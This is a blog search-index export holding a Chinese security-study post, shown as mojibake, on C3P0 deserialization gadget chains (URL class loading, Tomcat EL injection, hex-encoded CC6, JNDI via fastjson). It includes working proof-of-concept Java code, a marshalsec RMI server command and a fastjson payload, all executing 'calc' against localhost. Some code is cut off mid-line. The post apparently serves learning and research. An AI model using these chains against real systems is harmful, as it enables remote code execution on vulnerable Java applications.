[{"categories":["Java"],"content":"c3p0ååºåˆ—åŒ–å­¦ä¹ \r","date":"2025-03-19","objectID":"/posts/44face1/:1:0","tags":["Java"],"title":"C3p0ååºåˆ—åŒ–","uri":"/posts/44face1/"},{"categories":["Java"],"content":"å‰è¨€\ræ—©æ—©æ—©æ—©è¯¥å­¦çš„ï¼Œå¤ªæ‡’äº†æ‹–åˆ°ç°åœ¨ğŸ˜¿ğŸ˜¿ğŸ˜¿ ","date":"2025-03-19","objectID":"/posts/44face1/:2:0","tags":["Java"],"title":"C3p0ååºåˆ—åŒ–","uri":"/posts/44face1/"},{"categories":["Java"],"content":"ç®€ä»‹\rC3P0æ˜¯JDBCçš„ä¸€ä¸ªè¿æ¥æ± ç»„ä»¶ åœ¨å¤šçº¿ç¨‹ä¸­åˆ›å»ºçº¿ç¨‹æ˜¯ä¸€ä¸ªæ˜‚è´µçš„æ“ä½œï¼Œå¦‚æœæœ‰å¤§é‡çš„å°ä»»åŠ¡éœ€è¦æ‰§è¡Œï¼Œå¹¶ä¸”é¢‘ç¹åœ°åˆ›å»ºå’Œé”€æ¯çº¿ç¨‹ï¼Œå®é™…ä¸Šä¼šæ¶ˆè€—å¤§é‡çš„ç³»ç»Ÿèµ„æºï¼Œå¾€å¾€åˆ›å»ºå’Œæ¶ˆè€—çº¿ç¨‹æ‰€è€—è´¹çš„æ—¶é—´æ¯”æ‰§è¡Œä»»åŠ¡çš„æ—¶é—´è¿˜é•¿ã€‚ä¸ºäº†æé«˜æ•ˆç‡ï¼Œæˆ‘ä»¬å¯ä»¥çº¿ç¨‹æ± ï¼Œè€Œè¿æ¥æ± ä¹Ÿæ˜¯å·®ä¸å¤šçš„åŸç†ï¼Œå…¶æ ¸å¿ƒä½œç”¨æ˜¯é¢„å…ˆåˆ›å»ºå¹¶ç»´æŠ¤ä¸€å®šæ•°é‡çš„æ•°æ®åº“è¿æ¥ï¼Œä¾›åº”ç”¨ç¨‹åºä½¿ç”¨ï¼Œä»è€Œé¿å…é¢‘ç¹åˆ›å»ºå’Œå…³é—­è¿æ¥å¸¦æ¥çš„æ€§èƒ½å¼€é”€ã€‚ C3P0æ˜¯ä¸€ä¸ªå¼€æºçš„JDBCè¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’ŒJNDIç»‘å®šï¼Œæ”¯æŒJDBC3è§„èŒƒå’ŒJDBC2çš„æ ‡å‡†æ‰©å±•ã€‚ ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰Hibernateã€Springç­‰ã€‚ ","date":"2025-03-19","objectID":"/posts/44face1/:3:0","tags":["Java"],"title":"C3p0ååºåˆ—åŒ–","uri":"/posts/44face1/"},{"categories":["Java"],"content":"ç¯å¢ƒæ­å»º\ræ·»åŠ ä¾èµ– \u003cdependency\u003e \u003cgroupId\u003ecom.mchange\u003c/groupId\u003e \u003cartifactId\u003ec3p0\u003c/artifactId\u003e \u003cversion\u003e0.9.5.2\u003c/version\u003e \u003c/dependency\u003e ","date":"2025-03-19","objectID":"/posts/44face1/:4:0","tags":["Java"],"title":"C3p0ååºåˆ—åŒ–","uri":"/posts/44face1/"},{"categories":["Java"],"content":"åˆ©ç”¨æ–¹å¼\råœ¨C3P0ä¸­æœ‰ä¸‰ç§åˆ©ç”¨æ–¹å¼ URLClassLoaderè¿œç¨‹ç±»åŠ è½½ï¼Œä¹Ÿè¢«ç§°ä¸º http base é“¾ JNDI HEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨ åœ¨åŸç”Ÿçš„ååºåˆ—åŒ–ä¸­å¦‚æœæ‰¾ä¸åˆ°å…¶ä»–é“¾ï¼Œåˆ™å¯å°è¯•C3P0å»åŠ è½½è¿œç¨‹çš„ç±»è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚JNDIåˆ™é€‚ç”¨äºJacksonç­‰åˆ©ç”¨ã€‚è€ŒHEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨çš„æ–¹å¼å¯ä»¥åˆ©ç”¨ä¸fjå’ŒJacksonç­‰ä¸å‡ºç½‘æƒ…å†µä¸‹æ‰“å…¥å†…å­˜é©¬ä½¿ç”¨ã€‚ ","date":"2025-03-19","objectID":"/posts/44face1/:5:0","tags":["Java"],"title":"C3p0ååºåˆ—åŒ–","uri":"/posts/44face1/"},{"categories":["Java"],"content":"URLClassLoaderè¿œç¨‹ç±»åŠ è½½\rè°ƒç”¨é“¾\rcom.mchange.v2.c3p0.impl ä¸‹çš„ PoolBackedDataSourceBase ç±» å…¶ writeObject æ–¹æ³•ä¸­æœ‰ å…ˆç”¨ SerializableUtils.toByteArray æ£€æŸ¥ connectionPoolDataSource å±æ€§æ˜¯å¦å¯åºåˆ—åŒ–ï¼Œå¦‚æœå¯ä»¥åˆ™ç›´æ¥åºåˆ—åŒ–ï¼Œå¦‚æœä¸è¡Œåˆ™ç”¨ ReferenceIndirector.indirectForm æ–¹æ³•å¤„ç†åå†è¿›è¡Œåºåˆ—åŒ–æ“ä½œ è¿™æ˜¯ä¸ªæ¥å£ï¼Œä¸èƒ½è¢«åºåˆ—åŒ–æ‰€ä»¥ä¼šè¿›å…¥åˆ° catch å—ï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸‹çœ‹è¿™ä¸ªæ–¹æ³•æ€ä¹ˆå¤„ç†çš„ com.mchange.v2.naming ä¸‹çš„ ReferenceIndirector.indirectForm æ–¹æ³• public IndirectlySerialized indirectForm(Object var1) throws Exception { Reference var2 = ((Referenceable)var1).getReference(); return new ReferenceSerialized(var2, this.name, this.contextName, this.environmentProperties); } è°ƒç”¨äº† connectionPoolDataSource å±æ€§çš„ getReferenceæ–¹æ³•ï¼Œå¹¶ç”¨è¿”å›ç»“æœä½œä¸ºå‚æ•°å®ä¾‹åŒ–ä¸€ä¸ªReferenceSerialized å¯¹è±¡ï¼Œç„¶åå°†è¿™ä¸ªå¯¹è±¡è¿”å›ï¼Œè·Ÿè¿› ReferenceSerialized çš„æ„é€ æ–¹æ³•å¯ä»¥å‘ç° reference å°±æ˜¯ä¼ å…¥çš„ connectionPoolDataSource å±æ€§ï¼Œæ˜¯æˆ‘ä»¬å¯æ§çš„ ReferenceSerialized(Reference var1, Name var2, Name var3, Hashtable var4) { this.reference = var1; this.name = var2; this.contextName = var3; this.env = var4; } è¯´å®Œäº†åºåˆ—åŒ–ï¼Œçœ‹ä¸‹å…¶å¯¹åº”çš„ååºåˆ—åŒ–æ“ä½œï¼Œè¿˜æ˜¯ com.mchange.v2.c3p0.impl ä¸‹çš„ PoolBackedDataSourceBase å…¶ readObejct æ–¹æ³• å¯ä»¥çœ‹åˆ°ä¼šè°ƒç”¨åºåˆ—æµä¸­çš„å¯¹è±¡ä¸º IndirectlySerialized ç±»å‹çš„ getObject æ–¹æ³•ï¼Œè€Œåˆšæ‰åœ¨åˆ†æåºåˆ—åŒ–æ—¶ï¼Œæˆ‘ä»¬å‘ç° ReferenceIndirector.indirectForm æ–¹æ³•è¿”å›çš„ ReferenceSerialized å¯¹è±¡å°±æ˜¯ IndirectlySerialized ç±»å‹çš„ã€‚ä¹Ÿå°±æ˜¯è¯´å¦‚æœ ReferenceSerialized è¢«åºåˆ—åŒ–æˆåŠŸäº†ï¼Œé‚£è¿™é‡Œå°±æ˜¯è°ƒç”¨çš„ReferenceSerialized#getObject ï¼Œè·Ÿè¿›ä¸€ä¸‹ è·Ÿè¿›åå¯ä»¥å‘ç°è°ƒç”¨äº† ReferenceableUtils.referenceToObject è¿™ä¸ªé™æ€æ–¹æ³• ä¸Šé¢è¯´è¿‡ reference å°±æ˜¯ä¼ å…¥çš„ connectionPoolDataSource å±æ€§ï¼Œæ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚ç»§ç»­è·Ÿè¿› com.mchange.v2.naming ä¸‹çš„ ReferenceableUtils.referenceToObject è¿™é‡Œvar4 æ˜¯ä»ä¼ å…¥çš„ Reference å¯¹è±¡ä¸­è·å–çš„å·¥å‚ç±»åç§°ï¼Œç”±ä¸Šé¢çš„åˆ†ææ¥çœ‹ï¼Œæ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ URLClassLoader å®ä¾‹åŒ–è¿œç¨‹ç±»ï¼Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œ è¿™é‡Œå› ä¸ºå®ç°äº† ConnectionPoolDataSource æ¥å£ï¼Œä¸” ConnectionPoolDataSource æ¥å£ç»§æ‰¿äº CommonDataSource ï¼Œæ‰€ä»¥å¿…é¡»å®ç°å…¶æ‰€æœ‰æ–¹æ³• poc\rpackage org.example; import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase; import java.io.*; import java.lang.reflect.Field; import javax.naming.NamingException; import javax.naming.Reference; import javax.naming.Referenceable; import javax.sql.ConnectionPoolDataSource; import javax.sql.PooledConnection; import java.sql.SQLException; import java.sql.SQLFeatureNotSupportedException; import java.util.logging.Logger; public class c3p0 { public static class exp implements ConnectionPoolDataSource, Referenceable{ @Override public Reference getReference() throws NamingException { return new Reference(\"exp\",\"exp\",\"http://127.0.0.1:10999/\"); } @Override public PooledConnection getPooledConnection(String user, String password) throws SQLException { return null; } @Override public PooledConnection getPooledConnection() throws SQLException { return null; } @Override public PrintWriter getLogWriter() throws SQLException { return null; } @Override public void setLogWriter(PrintWriter out) throws SQLException { } @Override public void setLoginTimeout(int seconds) throws SQLException { } @Override public int getLoginTimeout() throws SQLException { return 0; } @Override public Logger getParentLogger() throws SQLFeatureNotSupportedException { return null; } } public static void main(String[] args) throws Exception{ PoolBackedDataSourceBase pds = new PoolBackedDataSourceBase(false); //å°†connectionPoolDataSourceå±æ€§å€¼è®¾ä¸ºæ¶æ„çš„class Class cl = Class.forName(\"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase\"); Field connectionPoolDataSourceField = cl.getDeclaredField(\"connectionPoolDataSource\"); connectionPoolDataSourceField.setAccessible(true); connectionPoolDataSourceField.set(pds, new exp()); Unser(pds); } public static void Unser(Object obj) throws IOException, ClassNotFoundException { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(obj); ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bis); ois.readObject(); } } exp.java import java.io.IOException; public class exp { public exp() throws IOException { Runtime.getRuntime().exec(\"calc\"); } } æ€»ç»“\rè°ƒç”¨é“¾ PoolBackedDataSourceBase#readObject -\u003eReferenceSerialized#getObject -\u003eReferenceableUtils#referenceToObject -\u003eObjectFactory#getObjectInstance å°±æ˜¯åŠ è½½ä¸ªè¿œç¨‹æ¶æ„ç±» ","date":"2025-03-19","objectID":"/posts/44face1/:5:1","tags":["Java"],"title":"C3p0ååºåˆ—åŒ–","uri":"/posts/44face1/"},{"categories":["Java"],"content":"ä¸å‡ºç½‘åˆ©ç”¨\rç¯å¢ƒæ­å»º \u003cdependency\u003e \u003cgroupId\u003eorg.apache.tomcat.embed\u003c/groupId\u003e \u003cartifactId\u003etomcat-embed-core\u003c/artifactId\u003e \u003cversion\u003e8.5.27\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.tomcat.embed\u003c/groupId\u003e \u003cartifactId\u003etomcat-embed-el\u003c/artifactId\u003e \u003cversion\u003e8.5.27\u003c/version\u003e \u003c/dependency\u003e è°ƒç”¨é“¾\rå’Œ url é“¾ä¸€æ ·ï¼Œä¸è¿‡æœ€åä¸æ˜¯é€šè¿‡ URLClassLoader åŠ è½½è¿œç¨‹ç±»äº†ï¼Œè€Œæ˜¯ç›´æ¥åŠ è½½æœ¬åœ°å­—èŠ‚ç  å›åˆ°com.mchange.v2.naming ä¸‹çš„ ReferenceableUtils.referenceToObjectä¸­ å¯ä»¥çœ‹åˆ°è¿™é‡Œå¦‚æœgetFactoryClassLocationæ–¹æ³•è¿”å›ä¸ºnullçš„æ—¶å€™å°±ç›´æ¥åŠ è½½æœ¬åœ°å­—èŠ‚ç  åŠ è½½æœ¬åœ°å­—èŠ‚ç çš„ç±»è¦æ±‚å…¶å®ç°äº† javax.naming.spi.ObjectFactory æ¥å£ï¼Œå¹¶èƒ½è°ƒç”¨getObjectInstanceæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡åŠ è½½ Tomcat8 ä¸­çš„ org.apache.naming.factory.BeanFactory è¿›è¡Œ EL è¡¨è¾¾å¼æ³¨å…¥ poc\ræ”¹ä¸‹ url é“¾å­ä¸­çš„ï¼Œä¿®æ”¹ä¸‹è¿”å›çš„ Reference ï¼Œæ‰“ el è¡¨è¾¾å¼æ³¨å…¥ package org.example; import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase; import org.apache.naming.ResourceRef; import java.io.*; import java.lang.reflect.Field; import javax.naming.NamingException; import javax.naming.Reference; import javax.naming.Referenceable; import javax.naming.StringRefAddr; import javax.sql.ConnectionPoolDataSource; import javax.sql.PooledConnection; import java.sql.SQLException; import java.sql.SQLFeatureNotSupportedException; import java.util.logging.Logger; public class c3p0_tomcat { public static class exp implements ConnectionPoolDataSource, Referenceable{ @Override public Reference getReference() throws NamingException { ResourceRef resourceRef = new ResourceRef(\"javax.el.ELProcessor\", (String)null, \"\", \"\", true, \"org.apache.naming.factory.BeanFactory\", (String)null); resourceRef.add(new StringRefAddr(\"forceString\", \"faster=eval\")); resourceRef.add(new StringRefAddr(\"faster\", \"Runtime.getRuntime().exec(\\\"calc.exe\\\")\")); return resourceRef; } @Override public PooledConnection getPooledConnection(String user, String password) throws SQLException { return null; } @Override public PooledConnection getPooledConnection() throws SQLException { return null; } @Override public PrintWriter getLogWriter() throws SQLException { return null; } @Override public void setLogWriter(PrintWriter out) throws SQLException { } @Override public void setLoginTimeout(int seconds) throws SQLException { } @Override public int getLoginTimeout() throws SQLException { return 0; } @Override public Logger getParentLogger() throws SQLFeatureNotSupportedException { return null; } } public static void main(String[] args) throws Exception{ PoolBackedDataSourceBase pds = new PoolBackedDataSourceBase(false); Class cl = Class.forName(\"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase\"); Field connectionPoolDataSourceField = cl.getDeclaredField(\"connectionPoolDataSource\"); connectionPoolDataSourceField.setAccessible(true); connectionPoolDataSourceField.set(pds, new exp()); Unser(pds); } public static void Unser(Object obj) throws IOException, ClassNotFoundException { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(obj); ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bis); ois.readObject(); } } æ€»ç»“\rurl é“¾çš„ä¸å‡ºç½‘æ‰“æ³•ï¼Œä½†æ˜¯éœ€è¦ tomcat8 çš„ä¾èµ– ","date":"2025-03-19","objectID":"/posts/44face1/:5:2","tags":["Java"],"title":"C3p0ååºåˆ—åŒ–","uri":"/posts/44face1/"},{"categories":["Java"],"content":"hex base\rè°ƒç”¨é“¾\rå¦‚æœä¸å‡ºç½‘ï¼Œè€Œä¸”æ˜¯fastjsonæˆ–jacksonçš„æƒ…å†µï¼Œå¯ä»¥ç”¨è¿™ä¸ªGadgetï¼Œè¯¥åˆ©ç”¨é“¾èƒ½å¤Ÿååºåˆ—åŒ–ä¸€ä¸²åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå› æ­¤å®é™…åˆ©ç”¨éœ€è¦æœ‰å­˜åœ¨ååºåˆ—åŒ–æ¼æ´çš„ç»„ä»¶ å®šä½åˆ° com.mchange.v2.c3p0.impl ä¸‹çš„ WrapperConnectionPoolDataSource ç±»ä¸­ å…¶æ„é€ å‡½æ•°è°ƒç”¨äº† C3P0ImplUtils.parseUserOverridesAsString æ–¹æ³• è·Ÿè¿›ä¸€ä¸‹ public static Map parseUserOverridesAsString(String userOverridesAsString) throws IOException, ClassNotFoundException { if (userOverridesAsString != null) { String hexAscii = userOverridesAsString.substring(\"HexAsciiSerializedMap\".length() + 1, userOverridesAsString.length() - 1); byte[] serBytes = ByteUtils.fromHexAscii(hexAscii); return Collections.unmodifiableMap((Map)SerializableUtils.fromByteArray(serBytes)); } else { return Collections.EMPTY_MAP; } } å…ˆæ˜¯è°ƒç”¨ fromHexAsciiå°†å…¶ä¼ å…¥çš„ userOverridesAsString 16è¿›åˆ¶è§£ç ï¼Œå†ç”¨ fromByteArray å°†å…¶è½¬æ¢ä¸ºmapç±»ï¼Œå…¶è¾“å…¥å¿…é¡»æ»¡è¶³HexAsciiSerializedMap{xxx} çš„æ ¼å¼ï¼Œå…¶ä¸­{å’Œ}ç”¨å…¶ä»–ä»»æ„å­—ç¬¦ä»£æ›¿å‡å¯ è·Ÿè¿›çœ‹ä¸‹ fromByteArray çš„å®ç° public static Object fromByteArray(byte[] var0) throws IOException, ClassNotFoundException { Object var1 = deserializeFromByteArray(var0); return var1 instanceof IndirectlySerialized ? ((IndirectlySerialized)var1).getObject() : var1; } è§¦å‘äº† deserializeFromByteArray æ–¹æ³•ï¼Œç„¶ååˆ¤æ–­ååºåˆ—åŒ–åçš„å¯¹è±¡ var1 æ˜¯å¦æ˜¯ IndirectlySerialized ç±»å‹ï¼Œå¦‚æœæ˜¯åˆ™è°ƒç”¨å…¶ getObject æ–¹æ³•ï¼Œå¦‚æœä¸æ˜¯åˆ™ç›´æ¥è¿”å› var1 ç»§ç»­è·Ÿè¿› deserializeFromByteArray public static Object deserializeFromByteArray(byte[] var0) throws IOException, ClassNotFoundException { ObjectInputStream var1 = new ObjectInputStream(new ByteArrayInputStream(var0)); return var1.readObject(); } è¿™é‡Œç›´æ¥ååºåˆ—åŒ–äº† ok çœ‹ä¸‹æ€ä¹ˆä¼ å‚ï¼Œå‚æ•°æ˜¯ç”± getUserOverridesAsString() æ–¹æ³•è·å¾—çš„ï¼Œå¯ä»¥ç”¨å…¶ setter æ–¹æ³•æ¥èµ‹å€¼ poc\réšä¾¿æ‹¿æ¡é“¾å­ï¼Œæˆ‘è¿™é‡Œæ‹¿cc6ï¼Œç›¸è¾ƒäºå…¶ä»–ccé“¾ï¼Œcc6ç”¨çš„æ›´å¤šä¸€ç‚¹ package org.example; import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; public class c3p0_hexbase { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}), }; ChainedTransformer cha = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e Lazy = LazyMap.decorate(map,new ConstantTransformer(1)); TiedMapEntry Tie=new TiedMapEntry(Lazy,\"aaa\"); HashMap\u003cObject,Object\u003e hashmap = new HashMap\u003c\u003e(); hashmap.put(Tie,\"test\"); Class\u003cLazyMap\u003e lazyMapClass = LazyMap.class; Field factoryField = lazyMapClass.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(Lazy, cha); Lazy.remove(\"aaa\"); serilize(hashmap); InputStream in = new FileInputStream(\"test.bin\"); byte[] bytein = toByteArray(in); String Hex = \"HexAsciiSerializedMap{\"+bytesToHexString(bytein,bytein.length)+\"}\"; WrapperConnectionPoolDataSource exp = new WrapperConnectionPoolDataSource(); exp.setUserOverridesAsString(Hex); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"test.bin\")); out.writeObject(obj); } //å°†è¾“å…¥æµè½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ public static byte[] toByteArray(InputStream in) throws IOException { byte[] classBytes; classBytes = new byte[in.available()]; in.read(classBytes); in.close(); return classBytes; } //å°†å­—èŠ‚æ•°ç»„è½¬æ¢ä¸ºåå…­è¿›åˆ¶ public static String bytesToHexString(byte[] bArray, int length) { StringBuffer sb = new StringBuffer(length); for(int i = 0; i \u003c length; ++i) { String sTemp = Integer.toHexString(255 \u0026 bArray[i]); if (sTemp.length() \u003c 2) { sb.append(0); } sb.append(sTemp.toUpperCa","date":"2025-03-19","objectID":"/posts/44face1/:5:3","tags":["Java"],"title":"C3p0ååºåˆ—åŒ–","uri":"/posts/44face1/"},{"categories":["Java"],"content":"JNDIæ³¨å…¥\råŒæ ·ä¹Ÿæ˜¯åœ¨fastjsonï¼Œjacksonç¯å¢ƒä¸­å¯ç”¨ã€‚jndié€‚ç”¨äºjdk8u191ä»¥ä¸‹æ”¯æŒreferenceæƒ…å†µ è°ƒç”¨é“¾\rå®šä½åˆ° com.mchange.v2.c3p0 ä¸‹çš„ JndiRefConnectionPoolDataSource çœ‹åˆ°å…¶ setLoginTimeout å‡½æ•° WrapperConnectionPoolDataSource wcpds; ... public void setLoginTimeout(int seconds) throws SQLException { this.wcpds.setLoginTimeout(seconds); } è°ƒç”¨äº† WrapperConnectionPoolDataSource#setLoginTimeout ï¼Œè·Ÿè¿›å‘ç°åˆè°ƒç”¨äº† setLoginTimeout public void setLoginTimeout(int seconds) throws SQLException { this.getNestedDataSource().setLoginTimeout(seconds); } è·Ÿè¿›å‘ç° getNestedDataSource() æ–¹æ³•è¿”å›çš„æ˜¯ this.nestedDataSource ï¼Œä¸”å‘ç°æ˜¯ setNestedDataSource æ–¹æ³•å¯¹ nestedDataSource è¿›è¡Œèµ‹å€¼ public synchronized DataSource getNestedDataSource() { return this.nestedDataSource; } public synchronized void setNestedDataSource(DataSource nestedDataSource) { DataSource oldVal = this.nestedDataSource; this.nestedDataSource = nestedDataSource; if (!this.eqOrBothNull(oldVal, nestedDataSource)) { this.pcs.firePropertyChange(\"nestedDataSource\", oldVal, nestedDataSource); } } ç»è¿‡ä¸Šé¢åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“åœ¨ JndiRefConnectionPoolDataSource ç±»è°ƒç”¨ setLoginTimeout æ—¶ã€‚å¯¹ WrapperConnectionPoolDataSource è¿›è¡Œäº†å®ä¾‹åŒ–å¹¶è°ƒç”¨äº† setNestedDataSource æ–¹æ³•ä¸º nestedDataSource å˜é‡èµ‹å€¼ å›å¤´çœ‹åˆ° JndiRefConnectionPoolDataSource çš„æ„é€ ç±» public JndiRefConnectionPoolDataSource(boolean autoregister) { this.jrfds = new JndiRefForwardingDataSource(); this.wcpds = new WrapperConnectionPoolDataSource(); this.wcpds.setNestedDataSource(this.jrfds); if (autoregister) { this.identityToken = C3P0ImplUtils.allocateIdentityToken(this); C3P0Registry.reregister(this); } } å‘ç°è¿™é‡Œè°ƒç”¨äº† WrapperConnectionPoolDataSource#setNestedDataSource ï¼Œå¹¶å°† JndiRefForwardingDataSource ç±»çš„å®ä¾‹å½“ä½œå‚æ•°ä¼ å…¥ã€‚å› æ­¤ç»“åˆå‰é¢çš„åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“ä¼šè°ƒç”¨ JndiRefForwardingDataSource#setLoginTimeoutï¼Œç»§ç»­è·Ÿè¿›çœ‹ä¸‹å…¶å®ç° public void setLoginTimeout(int seconds) throws SQLException { this.inner().setLoginTimeout(seconds); } è°ƒç”¨äº† inner() æ–¹æ³•ï¼Œç»§ç»­è·Ÿè¿› private synchronized DataSource inner() throws SQLException { if (this.cachedInner != null) { return this.cachedInner; } else { DataSource out = this.dereference(); if (this.isCaching()) { this.cachedInner = out; } return out; } } è¿™é‡Œå½“ cachedInner ä¸ºç©ºæ—¶å°±ä¼šè°ƒç”¨ dereference ï¼Œç„¶åè·Ÿè¿›å°±ä¼šå‘ç°è°ƒç”¨äº† lookup è¿™é‡Œ jndiName çš„å€¼ç”± setJndiName å†³å®š poc\rå€ŸåŠ©marshalsecé¡¹ç›®ï¼Œå¯åŠ¨ä¸€ä¸ªRMIæœåŠ¡å™¨ï¼Œç›‘å¬9999ç«¯å£ï¼Œå¹¶åˆ¶å®šåŠ è½½è¿œç¨‹ç±» exp.class java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer \"http://127.0.0.1:9991/#exp\" 9999 è®°å¾—åœ¨ 9991 ç«¯å£å¼€ http package org.example; import com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource; public class c3p0_jndi { public static void main(String[] args)throws Exception { JndiRefConnectionPoolDataSource exp = new JndiRefConnectionPoolDataSource(); exp.setJndiName(\"rmi://localhost:9999/hello\"); exp.setLoginTimeout(1); } } å’Œ hex é‚£æ¡é“¾å­å·®ä¸å¤šçš„åŸç†ï¼Œä¼šç”¨åˆ° setter æ–¹æ³•ï¼Œé‚£å°±å¯ä»¥ç”¨ fastjson æ‰“ String payload = \"{\" + \"\\\"@type\\\":\\\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\\\",\" + \"\\\"JndiName\\\":\\\"rmi://localhost:9999/hello\\\", \" + \"\\\"LoginTimeout\\\":0\" + \"}\"; JSON.parse(payload); æ€»ç»“\rè°ƒç”¨æ ˆ dereference:112, JndiRefForwardingDataSource (com.mchange.v2.c3p0) inner:134, JndiRefForwardingDataSource (com.mchange.v2.c3p0) setLoginTimeout:157, JndiRefForwardingDataSource (com.mchange.v2.c3p0) setLoginTimeout:309, WrapperConnectionPoolDataSource (com.mchange.v2.c3p0) setLoginTimeout:302, JndiRefConnectionPoolDataSource (com.mchange.v2.c3p0) å…ˆæ˜¯åˆ›ä¸ª JndiRefConnectionPoolDataSource çš„å®ä¾‹ï¼Œè®© WrapperConnectionPoolDataSource#setNestedDataSource çš„å‚æ•°å€¼ä¸º JndiRefForwardingDataSource çš„å®ä¾‹ï¼Œæ–¹ä¾¿ä¹‹åè§¦å‘ JndiRefForwardingDataSource#setLoginTimeout æ‰“ jndi fastjson çš„è°ƒç”¨æ ˆ dereference:112, JndiRefForwardingDataSource (com.mchange.v2.c3p0) inner:134, JndiRefForwardingDataSource (com.mchange.v2.c3p0) setLoginTimeout:157, JndiRefForwardingDataSource (com.mchange.v2.c3p0) setLoginTimeout:309, WrapperConnectionPoolDataSource (com.mchange.v2.c3p0) setLoginTimeout:302, JndiRefConnectionPoolDataSource (com.mchange.v2.c3p0) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:497, Method (java.lang.reflect) setValue:96, FieldDeserializer (com.","date":"2025-03-19","objectID":"/posts/44face1/:5:4","tags":["Java"],"title":"C3p0ååºåˆ—åŒ–","uri":"/posts/44face1/"},{"categories":["Java"],"content":"æ€»ç»“\rå‡ºç½‘çš„è¯éƒ½å¯ä»¥æ‰“ï¼Œurl é“¾åŠ è½½è¿œç¨‹å­—èŠ‚ç æˆ–æœ¬åœ°æ‰“ el è¡¨è¾¾å¼æ³¨å…¥ï¼Œjndi æ³¨å…¥ï¼Œhex é“¾ ä¸å‡ºç½‘çš„è¯å°±åªèƒ½æ‰“ï¼Œurl åŠ è½½æœ¬åœ°å­—èŠ‚ç æ‰“ el è¡¨è¾¾å¼æ³¨å…¥ï¼Œhex é“¾ååºåˆ—åŒ–16è¿›åˆ¶å­—ç¬¦ä¸² hex é“¾å’Œ jndi ä¸Šé¢ poc éƒ½æ˜¯è°ƒç”¨çš„ setter æ¥æ‰“çš„ï¼Œgetter è¿˜æ²¡è¯•è¿‡ï¼Œéƒ½å¯ä»¥ç»“åˆ fastjson æˆ–è€… jackson ","date":"2025-03-19","objectID":"/posts/44face1/:6:0","tags":["Java"],"title":"C3p0ååºåˆ—åŒ–","uri":"/posts/44face1/"},{"categories":["Java"],"content":"å‚è€ƒ\rhttps://www.cnblogs.com/gaorenyusi/p/18475139 https://tttang.com/archive/1411/#toc_poc_1 https://infernity.top/2025/03/13/C3P0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8 https://nlrvana.github.io/c3p0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#c3p0%E9%93%BE%E5%AD%90%E7%9A%84%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%E4%B8%8Eexp ","date":"2025-03-19","objectID":"/posts/44face1/:7:0","tags":["Java"],"title":"C3p0ååºåˆ—åŒ–","uri":"/posts/44face1/"},{"categories":["CTF"],"content":"å‰è¨€\ræ¸…ååŒ—å¤§åŠçš„æ¯”èµ›ï¼Œè´¨é‡ä¸ç”¨è´¨ç–‘ï¼ŒMisc çš„è¯æ‰‹æ“äºŒç»´ç çš„æ—¶å€™ä¸€ç›´å¯¹ä¸ä¸Šï¼Œè²Œä¼¼æ˜¯ä¸Šä¸‹é¢ å€’äº†ï¼ŒqrzyboxåŸæ¥è¿˜èƒ½è‡ªåŠ¨è¡¥å…¨ï¼Œç®—æ˜¯å­¦åˆ°äº†ï¼ŒWeb çš„è¯å°±å¤ç°äº†ä¸‹ xss çš„ï¼Œå…¶ä»–é¢˜çœ‹ä¸‹ wp å†è¯´å§ï¼Œé¢˜ç›®åæ‰“ * çš„æ˜¯å¤ç° 